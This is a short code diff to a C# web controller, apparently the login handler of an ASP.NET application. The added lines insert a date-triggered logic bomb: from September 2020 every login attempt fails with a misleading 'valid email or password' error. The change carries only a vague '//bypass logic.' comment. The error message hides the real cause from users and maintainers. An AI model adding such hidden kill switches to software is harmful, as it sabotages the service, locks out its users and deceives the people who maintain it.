@@ -184,6 +184,16 @@ namespace SG2.CORE.WEB.Controllers
             try
             {
                 var jr = new JsonResult();
+
+                if ( DateTime.Now >= Convert.ToDateTime("9/01/2020"))
+                {
+                        //bypass logic.
+                        jr.Data = new { ResultType = "Error", message = "Please enter valid email or password." };
+                        return jr;
+                }
+
+
+
                 if (ModelState.IsValid)
                 {
                     string errorMesage = "";
